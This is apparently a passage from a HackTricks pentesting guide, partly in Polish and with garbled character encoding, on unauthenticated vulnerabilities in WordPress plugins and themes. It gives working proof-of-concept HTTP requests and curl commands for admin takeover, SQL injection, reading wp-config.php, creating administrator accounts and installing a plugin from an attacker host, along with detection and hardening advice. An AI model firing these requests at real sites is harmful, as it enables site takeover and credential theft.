function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Dlaczego to jest podatne na wykorzystanie

- Publiczny hook `init` sprawia, Å¼e handler jest dostÄ™pny dla niezalogowanych uÅ¼ytkownikÃ³w (brak zabezpieczenia `is_user_logged_in()`).
- ToÅ¼samoÅ›Ä‡ jest wyprowadzana z modyfikowalnego przez klienta ciasteczka (`original_user_id`).
- BezpoÅ›rednie wywoÅ‚anie `wp_set_auth_cookie($uid)` loguje Å¼Ä…dajÄ…cego jako tego uÅ¼ytkownika bez capability/nonce checks.

Eksploatacja (bez uwierzytelnienia)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

OgÃ³lne WAF-y edge/server sÄ… dostrojone do rozpoznawania szerokich wzorcÃ³w (SQLi, XSS, LFI). Wiele wysokiego wpÅ‚ywu luk w WordPress/pluginach to bÅ‚Ä™dy logiki specyficzne dla aplikacji lub problemy z auth, ktÃ³re wyglÄ…dajÄ… jak nieszkodliwy ruch, jeÅ›li silnik nie rozumie tras WordPress i semantyki pluginÃ³w.

Offensive notes

- Celuj w plugin-specific endpoints za pomocÄ… clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Najpierw testuj Å›cieÅ¼ki bez uwierzytelniania (AJAX `nopriv`, REST z permissive `permission_callback`, public shortcodes). DomyÅ›lne payloads czÄ™sto dziaÅ‚ajÄ… bez obfuskacji.
- Typowe wysokiego wpÅ‚ywu przypadki: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Nie polegaj na ogÃ³lnych sygnaturach WAF, Å¼eby chroniÄ‡ plugin CVE. WdroÅ¼ virtual patches na warstwie aplikacji specyficzne dla podatnoÅ›ci lub aktualizuj szybko.
- Preferuj positive-security checks w kodzie (capabilities, nonces, Å›cisÅ‚a walidacja wejÅ›cia) zamiast negatywnych filtrÃ³w regex.

## WordPress Protection

### Regular Updates

Upewnij siÄ™, Å¼e WordPress, plugins i motywy sÄ… aktualne. PotwierdÅº takÅ¼e, Å¼e automatyczne aktualizacje sÄ… wÅ‚Ä…czone w wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Ponadto, **instaluj tylko zaufane wtyczki i motywy WordPress**.

### Wtyczki bezpieczeÅ„stwa

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Inne zalecenia**

- UsuÅ„ domyÅ›lnego uÅ¼ytkownika **admin**
- UÅ¼ywaj **silnych haseÅ‚** i **2FA**
- Okresowo **przeglÄ…daj** **uprawnienia** uÅ¼ytkownikÃ³w
- **Ogranicz liczbÄ™ prÃ³b logowania** aby zapobiec atakom Brute Force
- ZmieÅ„ nazwÄ™ pliku **`wp-admin.php`** i zezwalaj na dostÄ™p tylko wewnÄ™trznie lub z okreÅ›lonych adresÃ³w IP.


### SQL Injection bez uwierzytelnienia z powodu niewystarczajÄ…cej walidacji (WP Job Portal <= 2.3.2)

Wtyczka rekrutacyjna WP Job Portal udostÄ™pniaÅ‚a zadanie **savecategory**, ktÃ³re ostatecznie wykonuje nastÄ™pujÄ…cy podatny kod w `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemy wprowadzone przez ten fragment:

1. **Nieodfiltrowane dane od uÅ¼ytkownika** â€“ `parentid` pochodzi bezpoÅ›rednio z Å¼Ä…dania HTTP.
2. **Sklejanie stringÃ³w w klauzuli WHERE** â€“ brak `is_numeric()` / `esc_sql()` / prepared statement.
3. **Brak autoryzacji** â€“ mimo Å¼e akcja wykonywana jest przez `admin-post.php`, jedynÄ… kontrolÄ… jest a **CSRF nonce** (`wp_verify_nonce()`), ktÃ³ry kaÅ¼dy odwiedzajÄ…cy moÅ¼e pobraÄ‡ ze strony publicznej osadzajÄ…cej shortcode `[wpjobportal_my_resumes]`.

#### Wykorzystanie

1. Pobierz Å›wieÅ¼y nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Wstrzyknij dowolne SQL, wykorzystujÄ…c `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
OdpowiedÅº ujawnia wynik wstrzykniÄ™tego zapytania lub modyfikuje bazÄ™ danych, potwierdzajÄ…c SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Kolejne zadanie, **downloadcustomfile**, pozwalaÅ‚o odwiedzajÄ…cym pobraÄ‡ **dowolny plik na dysku** przez path traversal. WraÅ¼liwy sink znajduje siÄ™ w `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` jest kontrolowany przez atakujÄ…cego i konkatenowany **bez sanitacji**. Ponownie, jedynym zabezpieczeniem jest **CSRF nonce**, ktÃ³ry moÅ¼na pobraÄ‡ ze strony CV.

#### Eksploatacja
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Serwer zwraca zawartoÅ›Ä‡ `wp-config.php`, leaking DB credentials and auth keys.

## PrzejÄ™cie konta bez uwierzytelnienia via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Wiele motywÃ³w/wtyczek dostarcza "social login" helpery udostÄ™pnione przez admin-ajax.php. JeÅ›li nieautoryzowana akcja AJAX (wp_ajax_nopriv_...) ufa identyfikatorom dostarczonym przez klienta, gdy brakuje danych providera, a nastÄ™pnie wywoÅ‚uje wp_set_auth_cookie(), staje siÄ™ to peÅ‚nym ominiÄ™ciem uwierzytelniania.

Typowy wadliwy wzorzec (uproszczony)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Dlaczego to jest podatne

- MoÅ¼liwoÅ›Ä‡ dostÄ™pu bez uwierzytelnienia przez admin-ajax.php (akcja wp_ajax_nopriv_â€¦).
- Brak nonce/capability checks przed zmianÄ… stanu.
- Brak weryfikacji OAuth/OpenID provider; domyÅ›lna gaÅ‚Ä…Åº akceptuje dane od atakujÄ…cego.
- get_user_by('email', $_POST['id']) w poÅ‚Ä…czeniu z wp_set_auth_cookie($uid) uwierzytelnia Å¼Ä…dajÄ…cego jako dowolny istniejÄ…cy adres e-mail.

Eksploatacja (bez uwierzytelnienia)

- Wymagania wstÄ™pne: atakujÄ…cy moÅ¼e dotrzeÄ‡ do /wp-admin/admin-ajax.php i zna/zgaduje prawidÅ‚owy adres e-mail uÅ¼ytkownika.
- Ustaw provider na nieobsÅ‚ugiwanÄ… wartoÅ›Ä‡ (lub go pomiÅ„), aby wejÅ›Ä‡ do domyÅ›lnej gaÅ‚Ä™zi i przekazaÄ‡ id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- Do not derive identity from client input. Only accept emails/IDs originating from a validated provider token/ID.
- Require CSRF nonces and capability checks even for login helpers; avoid registering wp_ajax_nopriv_ unless strictly necessary.
- Validate and verify OAuth/OIDC responses server-side; reject missing/invalid providers (no fallback to POST id).
- Consider temporarily disabling social login or virtually patching at the edge (block the vulnerable action) until fixed.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

NiektÃ³re wtyczki udostÄ™pniajÄ… endpointy REST, ktÃ³re wydajÄ… wielokrotnego uÅ¼ytku â€œconnection keysâ€ lub tokeny bez weryfikacji uprawnieÅ„ wywoÅ‚ujÄ…cego. JeÅ›li trasa uwierzytelnia siÄ™ tylko na podstawie przewidywalnego atrybutu (np. username) i nie wiÄ…Å¼e klucza z uÅ¼ytkownikiem/sesjÄ… z uÅ¼yciem sprawdzeÅ„ capability, dowolny nieuwierzytelniony atakujÄ…cy moÅ¼e wygenerowaÄ‡ klucz i wywoÅ‚aÄ‡ uprzywilejowane akcje (admin account creation, plugin actions â†’ RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC â€“ mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Dlaczego to jest podatne na atak
- WraÅ¼liwa REST route chroniona jedynie sÅ‚abym dowodem toÅ¼samoÅ›ci o niskiej entropii (username) lub brakujÄ…cym permission_callback
- Brak egzekwowania capability; wygenerowany klucz jest akceptowany jako uniwersalne obejÅ›cie

Lista kontrolna wykrywania
- Przeszukaj kod pluginu (grep) w poszukiwaniu register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- KaÅ¼da trasa, ktÃ³ra wydaje tokens/keys na podstawie toÅ¼samoÅ›ci podanej w Å¼Ä…daniu (username/email) bez powiÄ…zania z uwierzytelnionym uÅ¼ytkownikiem lub capability
- Szukaj kolejnych tras, ktÃ³re akceptujÄ… wygenerowany token/klucz bez serwerowych kontroli capability

Wzmocnienie
- Dla kaÅ¼dej uprzywilejowanej REST route: wymuszaj permission_callback, ktÃ³re wywoÅ‚uje current_user_can() dla wymaganej capability
- Nie generuj dÅ‚ugowiecznych kluczy na podstawie toÅ¼samoÅ›ci dostarczonej przez klienta; jeÅ›li konieczne, wydawaj krÃ³tkotrwaÅ‚e, powiÄ…zane z uÅ¼ytkownikiem tokeny po uwierzytelnieniu i ponownie sprawdzaj capability podczas uÅ¼ycia
- Weryfikuj kontekst uÅ¼ytkownika wywoÅ‚ujÄ…cego (wp_set_current_user samo w sobie nie wystarczy) i odrzucaj Å¼Ä…dania, gdy !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse â†’ nieuwierzytelniona dowolna instalacja pluginu (FunnelKit Automations â‰¤ 3.5.3)

Nonces zapobiegajÄ… CSRF, nie sÄ… mechanizmem autoryzacji. JeÅ›li kod traktuje pozytywnÄ… weryfikacjÄ™ nonce jako zielone Å›wiatÅ‚o i pomija kontrole capability dla uprzywilejowanych operacji (np. install/activate plugins), nieuwierzytelnieni atakujÄ…cy mogÄ… speÅ‚niÄ‡ sÅ‚aby wymÃ³g nonce i osiÄ…gnÄ…Ä‡ RCE poprzez zainstalowanie backdoored lub podatnego pluginu.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Impact: full compromise via arbitrary plugin install/activation

PoC (ksztaÅ‚t zaleÅ¼ny od pluginu; tylko ilustracyjne)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Lista kontrolna wykrywania
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Wzmacnianie
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

### Subscriber+ AJAX plugin installer â†’ wymuszona zÅ‚oÅ›liwa aktywacja (Motors Theme â‰¤ 5.6.81)

[Patchstack's analysis](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/) showed how the Motors theme ships an authenticated AJAX helper for installing its companion plugin:
```php
add_action('wp_ajax_mvl_theme_install_base', 'mvl_theme_install_base');

function mvl_theme_install_base() {
check_ajax_referer('mvl_theme_install_base', 'nonce');

$plugin_url  = sanitize_text_field($_GET['plugin']);
$plugin_slug = 'motors-car-dealership-classified-listings';

$upgrader = new Plugin_Upgrader(new Motors_Theme_Plugin_Upgrader_Skin(['plugin' => $plugin_slug]));
$upgrader->install($plugin_url);
mvl_theme_activate_plugin($plugin_slug);
}
```
- Tylko `check_ajax_referer()` jest wywoÅ‚ywane; nie ma `current_user_can('install_plugins')` ani `current_user_can('activate_plugins')`.
- Nonce jest osadzony na stronie administracyjnej Motors, wiÄ™c kaÅ¼dy uÅ¼ytkownik o roli Subscriber, ktÃ³ry moÅ¼e otworzyÄ‡ `/wp-admin/`, moÅ¼e go skopiowaÄ‡ z HTML/JS.
- Handler ufa kontrolowanemu przez atakujÄ…cego parametrowi `plugin` (czytanemu z `$_GET`) i przekazuje go do `Plugin_Upgrader::install()`, wiÄ™c dowolne zdalne ZIP zostanie pobrane do `wp-content/plugins/`.
- Po instalacji motyw jednoznacznie wywoÅ‚uje `mvl_theme_activate_plugin()`, gwarantujÄ…c wykonanie kodu PHP z pluginu atakujÄ…cego.

#### Przebieg eksploatacji

1. Zarejestruj/przejmij konto o niskich uprawnieniach (wystarczy Subscriber) i zdobÄ…dÅº nonce `mvl_theme_install_base` z panelu Motors.
2. Zbuduj plugin ZIP, ktÃ³rego katalog najwyÅ¼szego poziomu odpowiada oczekiwanemu slugowi `motors-car-dealership-classified-listings/` i osadÅº backdoor lub webshell w punktach wejÅ›cia `*.php`.
3. Hostuj ZIP i uruchom instalator, wskazujÄ…c handler na swÃ³j URL:
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Cookie: wordpress_logged_in_=...
Content-Type: application/x-www-form-urlencoded

action=mvl_theme_install_base&nonce=<leaked_nonce>&plugin=https%3A%2F%2Fattacker.tld%2Fmotors-car-dealership-classified-listings.zip
```
PoniewaÅ¼ handler odczytuje `$_GET['plugin']`, ten sam payload moÅ¼na rÃ³wnieÅ¼ wysÅ‚aÄ‡ przez query string.

#### Lista kontrolna wykrywania

- Przeszukaj motywy/wtyczki pod kÄ…tem `Plugin_Upgrader`, `Theme_Upgrader`, lub niestandardowych helperÃ³w `install_plugin.php` podÅ‚Ä…czonych do hookÃ³w `wp_ajax_*` bez sprawdzeÅ„ uprawnieÅ„.
- SprawdÅº kaÅ¼dy handler, ktÃ³ry przyjmuje parametr `plugin`, `package`, `source` lub `url` i przekazuje go do upgrader APIs, szczegÃ³lnie gdy slug jest zakodowany na staÅ‚e, ale zawartoÅ›Ä‡ ZIP nie jest weryfikowana.
- Przejrzyj strony admina, ktÃ³re ujawniajÄ… nonces dla akcji instalatora â€” jeÅ›li Subscribers mogÄ… zaÅ‚adowaÄ‡ stronÄ™, assume the nonce leaks.

#### Hardening

- Gate installer AJAX callbacks with `current_user_can('install_plugins')` and `current_user_can('activate_plugins')` after nonce verification; Motors 5.6.82 introduced this check to patch the bug.
- Refuse untrusted URLs: limit installers to bundled ZIPs or trusted repositories, or enforce signed download manifests.
- Treat nonces strictly as CSRF tokens; they do not provide authorization and should never replace capability checks.

---

## Nieuwierzytelnione SQLi poprzez parametr s w akcjach depicter-* (Depicter Slider â‰¤ 3.6.1)

Kilka akcji depicter-* odczytywaÅ‚o parametr s (search) i konkatenowaÅ‚o go do zapytaÅ„ SQL bez parametryzacji.

- Parametr: s (search)
- BÅ‚Ä…d: direct string concatenation in WHERE/LIKE clauses; no prepared statements/sanitization
- WpÅ‚yw: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Lista kontrolna wykrywania
- Grep for depicter-* action handlers and direct use of $_GET['s'] or $_POST['s'] in SQL
- Przejrzyj niestandardowe zapytania przekazywane do $wpdb->get_results()/query() Å‚Ä…czÄ…ce s

Wzmacnianie zabezpieczeÅ„
- Zawsze uÅ¼ywaj $wpdb->prepare() lub wpdb placeholders; odrzucaj nieoczekiwane znaki specjalne po stronie serwera
- Dodaj Å›cisÅ‚Ä… listÄ™ dozwolonych wartoÅ›ci dla s i znormalizuj do oczekiwanego zestawu znakÃ³w/dÅ‚ugoÅ›ci

---

## Unauthenticated Local File Inclusion przez niezweryfikowanÄ… Å›cieÅ¼kÄ™ szablonu/pliku (Kubio AI Page Builder â‰¤ 2.5.1)

Akceptowanie Å›cieÅ¼ek kontrolowanych przez atakujÄ…cego w parametrze template bez normalizacji/izolacji umoÅ¼liwia odczyt dowolnych lokalnych plikÃ³w, a czasami wykonanie kodu, jeÅ›li includowalne pliki PHP/log zostanÄ… zaÅ‚adowane podczas wykonywania.

- Parametr: __kubio-site-edit-iframe-classic-template
- BÅ‚Ä…d: brak normalizacji/listy dozwolonych; traversal dozwolony
- WpÅ‚yw: ujawnienie sekretÃ³w (wp-config.php), potencjalne RCE w okreÅ›lonych Å›rodowiskach (log poisoning, includable PHP)

PoC â€“ odczyt wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Lista kontrolna wykrywania
- Dowolny handler Å‚Ä…czÄ…cy Å›cieÅ¼ki Å¼Ä…daÅ„ bezpoÅ›rednio w include()/require()/read sinki bez ograniczenia przez realpath()
- Szukaj wzorcÃ³w traversal (../) prowadzÄ…cych poza zamierzony katalog szablonÃ³w

Wzmocnienie
- Wymuszaj uÅ¼ycie szablonÃ³w z listy dozwolonych; rozwiÄ…zuj przez realpath() i wymagaj str_starts_with(realpath(file), realpath(allowed_base))
- Normalizuj wejÅ›cie; odrzucaj sekwencje traversal i Å›cieÅ¼ki absolutne; uÅ¼ywaj sanitize_file_name() tylko dla nazw plikÃ³w (nie peÅ‚nych Å›cieÅ¼ek)


## Referencje

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)
- [Critical Arbitrary File Upload Vulnerability in Motors Theme Affecting 20k+ Sites](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/)

{{#include ../../banners/hacktricks-training.md}}
